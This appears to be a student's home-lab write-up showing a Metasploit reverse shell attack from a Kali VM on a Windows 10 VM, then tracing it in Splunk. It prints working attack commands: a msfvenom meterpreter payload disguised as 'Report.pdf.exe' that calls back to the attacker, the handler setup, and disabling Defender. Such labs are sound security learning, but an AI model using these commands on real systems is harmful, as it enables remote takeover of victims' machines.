 # MSF,Splunk and Reverse Shell Attack Demonstration

> MSF (Metsploit Framework) is an open-source tool that is used to create and run exploit code remotely onto target systems.

> Splunk is a big data platform that manages large volumes of data by searching for information within it and indexes it.

> A reverse shell attack is an attack where an attacker initiates a shell session on the target's comptuer and redirects the input and output so that the attacker can access it remoteley. From here, the attacker's opportunities are limitless as they can open ports to the target machine and allow for a complete takeover of the machine. 

##Overview
This project has two objectives; one is to demonstrate how hackers exploit ports and use MSF to carry out attacks such as the reverse shell attack, and the other is to view data from the target machine on Splunk and locate the cause of the attack. This will be done by creating two virtual machines, one running Kali Linux (the attacker machine) and the other running Windows 10 (the target machine). MSF will be used to create the payload on the Kali virtual machine `(VM)` and will be delivered to the Windows 10 VM using an .exe file, diguised as a .pdf. The exploit will then be executed and will create a shell window on the Kali machine, allowing for any command to be carried out using the CLI. Data and fields should then be visible on Splunk and would provide data to a security analyst to determine the cause of the attack.



## Purpose of a home lab
As a student who is aspiring to break into the cybersecurity field, I have learnt that hands-on experience is essential to be kept in the loop as the field is everchanging. A home lab allows for me to test out real-world problems, experiment and learn to understand how attacks occur in a safe, sandboxed environment. For this project, I will set up two virtual machines (one running Kali Linux and the other running Windows 10) and have one act as an attacker and the other as a target. I will try to gain access to the Windows virtual machine’s shell via a reverse shell attack. A reverse shell attack initiates a shell session and allows for the attacker to redirect the input and outputs of the shell so that it can be used by the attacker. The delivery method of this attack that I will use is an .exe file disguised as a .pdf.




## Steps followed
1.	First, I chose a hosted hypervisor. I chose Virtualbox because I was familiar with it and had previously used it.
2.	Next, I downloaded Kali Linux and the Windows 10 ISO from their respective websites and set them up on Virtualbox.
3.	I downloaded Sysmon and Splunk on the Windows 10 machine at this point as it still has a connection to the internet.
4.	Both virtual machines were then both configured to be part of their own internal network, meaning they could communicate with each other but did not have an active connection to the internet. Static IPs were set for each one.
5.	Creating infected file on Kali Linux VM using the terminal :

        a.	“nmap -A {Windows 10 VM IP} -Pn “ – scans for any open ports on the target machine
        
        b.	Returned that port 3389 was exposed
  
        c.	“msfvenom -p windows/x64/meterpreter_reverse_tcp lhost={Kali VM IP} lport=4444 -f exe -o Report.pdf.exe” – this command specifies the payload of the attack (reverse tcp), specifies the host of the attack, the port and the file and it’s format.
<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture1.png">
</div>


  	    d.	“msfconsole” -> “use exploit/multi/handler” -> “set payload windows/x64/meterpreter/reverse_tcp “ – sets the payload option
  	
        e.	“exploit” – starts the handler
  	
        f.	“python3 -m http.server 999” – allows for the Windows machine in the same network to access the infected file 


<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture2.png">
</div>

<br>
<br>

<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture3.png">
</div>

        g.	Disable Windows Defender and open the file on the Windows VM

  	    h.	Looking at the Kali machine should show that you are connected to the target and should allow you to execute commands on it 
 
<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture4.png">
</div>


7.	Access Splunk and create an index with the name ‘endpoint’
<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture5.png">
</div>
8.	Go to the search and reporting app on Splunk and type ‘index=”endpoint” {Kali IP Address}’ 

<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture6.png">
</div>
 
9.	Looking at the fields, we can see that the Kali Linux machine is accessing a port, which would be something of interest to investigate.

<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture7.png">
</div>
 
10.	Looking further into the event IDs, we can see that the issue comes from the Report.pdf.exe.
 
<div align="center">
  <img src="https://github.com/JaskaranM/Jaskaran-Porfolio/blob/main/images/Picture8.png">
</div>

This was a simple demonstration of how exploits can be used to target exposed ports, how malware can take control of a victim’s computer and how tools like Splunk can be used to detect unusual events which can allow for the user to take action and solve the problem
